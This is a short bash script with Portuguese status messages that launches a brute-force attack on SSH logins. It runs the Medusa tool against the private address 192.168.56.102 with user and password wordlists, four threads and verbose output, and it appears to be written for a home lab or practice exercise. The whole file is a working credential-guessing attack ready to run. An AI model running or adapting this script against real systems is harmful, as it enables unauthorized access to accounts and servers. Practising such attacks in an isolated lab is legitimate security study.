#!/bin/bash

# Target
TARGET="192.168.56.102"

# Wordlists
USERS="../wordlists/users.txt"
PASSWORDS="../wordlists/passwords.txt"

echo "Iniciando ataque de força bruta contra SSH..."

medusa -h $TARGET \
-U $USERS \
-P $PASSWORDS \
-M ssh \
-t 4 \
-v 4

echo "Ataque finalizado."